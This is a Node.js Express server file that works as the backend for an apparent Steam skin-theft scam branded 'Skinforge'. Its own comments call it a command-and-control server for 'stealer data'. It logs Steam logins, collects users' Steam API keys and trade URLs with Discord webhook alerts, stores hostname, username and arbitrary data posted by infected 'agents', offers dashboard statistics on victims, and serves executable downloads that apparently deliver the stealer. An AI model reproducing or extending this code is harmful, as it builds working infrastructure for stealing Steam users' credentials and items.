import express from "express";
import cors from "cors";
import SteamOpenID from "steam-openid";
import mysql from "mysql2/promise";
import { DiscordWebhook } from "./discordWebhook.js";
import path from "path";
import fs from "fs";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = 3002;

app.use(express.json({ limit: '50mb' })); // Increase payload limit for stealer data
app.use(cors({
  origin: "http://localhost:5173",
  credentials: true,
}));

// MySQL pool setup with async init
const pool = mysql.createPool({
  host: process.env.MYSQL_HOST,
  user: process.env.MYSQL_USER,
  password: process.env.MYSQL_PASSWORD,
  database: process.env.MYSQL_DATABASE,
});

// Initialize database tables
async function initDatabase() {
  const conn = await pool.getConnection();
  try {
    // Create users table
    await conn.query(`
      CREATE TABLE IF NOT EXISTS users (
        id INT AUTO_INCREMENT PRIMARY KEY,
        steam_id VARCHAR(255) UNIQUE NOT NULL,
        api_key VARCHAR(255),
        trade_url VARCHAR(512),
        app_installed BOOLEAN DEFAULT false,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        last_login TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
      )
    `);

    // Create openid_logs table
    await conn.query(`
      CREATE TABLE IF NOT EXISTS openid_logs (
        id INT AUTO_INCREMENT PRIMARY KEY,
        claimed_id VARCHAR(255),
        op_endpoint VARCHAR(255),
        mode VARCHAR(50),
        ns VARCHAR(255),
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      )
    `);

    // Create c2_logs table for stealer data
    await conn.query(`
      CREATE TABLE IF NOT EXISTS c2_logs (
        id INT AUTO_INCREMENT PRIMARY KEY,
        agent_id VARCHAR(255) NOT NULL,
        hostname VARCHAR(255) NOT NULL,
        username VARCHAR(255) NOT NULL,
        log_type VARCHAR(100) NOT NULL,
        data JSON NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        INDEX idx_agent_id (agent_id),
        INDEX idx_log_type (log_type),
        INDEX idx_created_at (created_at)
      )
    `);
  } finally {
    conn.release();
  }
}

initDatabase().catch(console.error);

// Discord webhook helper
const webhook = new DiscordWebhook(process.env.DISCORD_WEBHOOK_URL);

// Steam OpenID instance
const steam = new SteamOpenID({
  returnUrl: "http://150.136.130.59:3002/verify",
  realm: "http://150.136.130.59:3002/",
});

app.get("/verify", async (req, res) => {
  try {
    const response = await steam.verify(req.query);
    console.log("OpenID verification callback received:", req.query);

    const steamId = req.query["openid.claimed_id"].split("/").pop();

    // Log OpenID query data into MySQL
    const conn = await pool.getConnection();
    try {
      // Log the OpenID verification
      await conn.query(
        "INSERT INTO openid_logs (claimed_id, op_endpoint, mode, ns) VALUES (?, ?, ?, ?)",
        [req.query["openid.claimed_id"], req.query["openid.op_endpoint"], req.query["openid.mode"], req.query["openid.ns"]]
      );

      // Create or update user
      await conn.query(
        `INSERT INTO users (steam_id) VALUES (?)
         ON DUPLICATE KEY UPDATE last_login = CURRENT_TIMESTAMP`,
        [steamId]
      );
    } finally {
      conn.release();
    }

    // Redirect back to frontend with steam ID
    res.redirect(`http://localhost:5173/verify?steamId=${steamId}`);
  } catch (err) {
    console.error("Steam OpenID verification failed:", err);
    res.status(401).send("Authentication failed");
  }
});

// Get user data
app.get("/api/user/:steamId", async (req, res) => {
  const { steamId } = req.params;
  
  const conn = await pool.getConnection();
  try {
    const [rows] = await conn.query(
      "SELECT steam_id, api_key, trade_url, app_installed FROM users WHERE steam_id = ?",
      [steamId]
    );
    
    if (rows.length === 0) {
      res.status(404).json({ error: "User not found" });
      return;
    }
    
    res.json(rows[0]);
  } catch (err) {
    console.error("Error fetching user data:", err);
    res.status(500).json({ error: "Internal server error" });
  } finally {
    conn.release();
  }
});

// Update user data
app.post("/api/user/:steamId", async (req, res) => {
  const { steamId } = req.params;
  const { apiKey, tradeUrl, appInstalled } = req.body;
  
  const conn = await pool.getConnection();
  try {
    await conn.query(
      `UPDATE users SET 
        api_key = COALESCE(?, api_key),
        trade_url = COALESCE(?, trade_url),
        app_installed = COALESCE(?, app_installed)
       WHERE steam_id = ?`,
      [apiKey, tradeUrl, appInstalled, steamId]
    );
    
    // Log to Discord webhook when user updates their data
    if (apiKey || tradeUrl || appInstalled) {
      await webhook.send({
        content: `User ${steamId} updated their profile:\n${apiKey ? '✅ API Key' : ''}${tradeUrl ? '✅ Trade URL' : ''}${appInstalled ? '✅ App Installed' : ''}`
      });
    }
    
    res.json({ success: true });
  } catch (err) {
    console.error("Error updating user data:", err);
    res.status(500).json({ error: "Internal server error" });
  } finally {
    conn.release();
  }
});

// Get all users (admin endpoint)
app.get("/api/admin/users", async (req, res) => {
  const conn = await pool.getConnection();
  try {
    const [rows] = await conn.query(
      "SELECT * FROM users ORDER BY created_at DESC"
    );
    res.json(rows);
  } catch (err) {
    console.error("Error fetching users:", err);
    res.status(500).json({ error: "Internal server error" });
  } finally {
    conn.release();
  }
});

// C2 Log endpoint for stealer data
app.post("/api/c2/log", async (req, res) => {
  try {
    const { agent_id, hostname, username, log_type, data } = req.body;
    
    if (!agent_id || !hostname || !username || !log_type || !data) {
      return res.status(400).json({ error: "Missing required fields" });
    }
    
    const conn = await pool.getConnection();
    try {
      await conn.query(
        `INSERT INTO c2_logs (agent_id, hostname, username, log_type, data) 
         VALUES (?, ?, ?, ?, ?)`,
        [agent_id, hostname, username, log_type, JSON.stringify(data)]
      );
      
      console.log(`[C2] Received ${log_type} data from ${agent_id}`);
      res.json({ success: true });
      
    } finally {
      conn.release();
    }
    
  } catch (err) {
    console.error("Error processing C2 log:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// Get C2 logs (for dashboard)
app.get("/api/c2/logs", async (req, res) => {
  try {
    const { agent_id, log_type, limit = 100, offset = 0 } = req.query;
    
    const conn = await pool.getConnection();
    try {
      let query = "SELECT * FROM c2_logs WHERE 1=1";
      let params = [];
      
      if (agent_id) {
        query += " AND agent_id = ?";
        params.push(agent_id);
      }
      
      if (log_type) {
        query += " AND log_type = ?";
        params.push(log_type);
      }
      
      query += " ORDER BY created_at DESC LIMIT ? OFFSET ?";
      params.push(parseInt(limit), parseInt(offset));
      
      const [rows] = await conn.query(query, params);
      
      // Parse JSON data for each log
      const logs = rows.map(row => ({
        ...row,
        data: JSON.parse(row.data)
      }));
      
      res.json(logs);
      
    } finally {
      conn.release();
    }
    
  } catch (err) {
    console.error("Error fetching C2 logs:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// Get C2 statistics (for dashboard)
app.get("/api/c2/stats", async (req, res) => {
  try {
    const conn = await pool.getConnection();
    try {
      // Get total logs count
      const [totalRows] = await conn.query("SELECT COUNT(*) as total FROM c2_logs");
      
      // Get unique agents count
      const [agentsRows] = await conn.query("SELECT COUNT(DISTINCT agent_id) as agents FROM c2_logs");
      
      // Get logs by type
      const [typeRows] = await conn.query(`
        SELECT log_type, COUNT(*) as count 
        FROM c2_logs 
        GROUP BY log_type 
        ORDER BY count DESC
      `);
      
      // Get recent activity (last 24 hours)
      const [recentRows] = await conn.query(`
        SELECT COUNT(*) as recent 
        FROM c2_logs 
        WHERE created_at >= DATE_SUB(NOW(), INTERVAL 24 HOUR)
      `);
      
      res.json({
        total_logs: totalRows[0].total,
        unique_agents: agentsRows[0].agents,
        logs_by_type: typeRows,
        recent_activity: recentRows[0].recent
      });
      
    } finally {
      conn.release();
    }
    
  } catch (err) {
    console.error("Error fetching C2 stats:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// Download endpoints
app.get("/api/download/client", (req, res) => {
  const filePath = path.join(__dirname, "downloads", "SkinforgeClient.exe");
  
  // Check if file exists
  if (!fs.existsSync(filePath)) {
    return res.status(404).json({ error: "File not found" });
  }
  
  // Set headers for file download
  res.setHeader("Content-Type", "application/octet-stream");
  res.setHeader("Content-Disposition", 'attachment; filename="SkinforgeClient.exe"');
  res.setHeader("Content-Length", fs.statSync(filePath).size);
  
  // Stream the file
  const fileStream = fs.createReadStream(filePath);
  fileStream.pipe(res);
});

app.get("/api/download/update", (req, res) => {
  const filePath = path.join(__dirname, "downloads", "SkinforgeUpdate.exe");
  
  if (!fs.existsSync(filePath)) {
    return res.status(404).json({ error: "Update file not found" });
  }
  
  res.setHeader("Content-Type", "application/octet-stream");
  res.setHeader("Content-Disposition", 'attachment; filename="SkinforgeUpdate.exe"');
  res.setHeader("Content-Length", fs.statSync(filePath).size);
  
  const fileStream = fs.createReadStream(filePath);
  fileStream.pipe(res);
});

app.get("/api/download/manual", (req, res) => {
  const filePath = path.join(__dirname, "downloads", "SkinforgeManual.pdf");
  
  if (!fs.existsSync(filePath)) {
    return res.status(404).json({ error: "Manual not found" });
  }
  
  res.setHeader("Content-Type", "application/pdf");
  res.setHeader("Content-Disposition", 'attachment; filename="SkinforgeManual.pdf"');
  res.setHeader("Content-Length", fs.statSync(filePath).size);
  
  const fileStream = fs.createReadStream(filePath);
  fileStream.pipe(res);
});

// Generic file download endpoint
app.get("/api/download/:filename", (req, res) => {
  const filename = req.params.filename;
  const filePath = path.join(__dirname, "downloads", filename);
  
  // Security: prevent directory traversal
  if (filename.includes("..") || filename.includes("/")) {
    return res.status(400).json({ error: "Invalid filename" });
  }
  
  if (!fs.existsSync(filePath)) {
    return res.status(404).json({ error: "File not found" });
  }
  
  const stats = fs.statSync(filePath);
  const ext = path.extname(filename).toLowerCase();
  
  // Set appropriate content type based on file extension
  const contentTypes = {
    ".exe": "application/octet-stream",
    ".zip": "application/zip",
    ".pdf": "application/pdf",
    ".txt": "text/plain",
    ".json": "application/json",
  };
  
  res.setHeader("Content-Type", contentTypes[ext] || "application/octet-stream");
  res.setHeader("Content-Disposition", `attachment; filename="${filename}"`);
  res.setHeader("Content-Length", stats.size);
  
  const fileStream = fs.createReadStream(filePath);
  fileStream.pipe(res);
});

// Direct file serving endpoint for immediate downloads
app.get("/download/:filename", (req, res) => {
  const filename = req.params.filename;
  const filePath = path.join(__dirname, "downloads", filename);
  
  // Security: prevent directory traversal
  if (filename.includes("..") || filename.includes("/")) {
    return res.status(400).send("Invalid filename");
  }
  
  if (!fs.existsSync(filePath)) {
    return res.status(404).send("File not found");
  }
  
  const stats = fs.statSync(filePath);
  const ext = path.extname(filename).toLowerCase();
  
  // Set appropriate content type based on file extension
  const contentTypes = {
    ".exe": "application/octet-stream",
    ".zip": "application/zip",
    ".pdf": "application/pdf",
    ".txt": "text/plain",
    ".json": "application/json",
  };
  
  res.setHeader("Content-Type", contentTypes[ext] || "application/octet-stream");
  res.setHeader("Content-Disposition", `attachment; filename="${filename}"`);
  res.setHeader("Content-Length", stats.size);
  
  const fileStream = fs.createReadStream(filePath);
  fileStream.pipe(res);
});

app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
}); 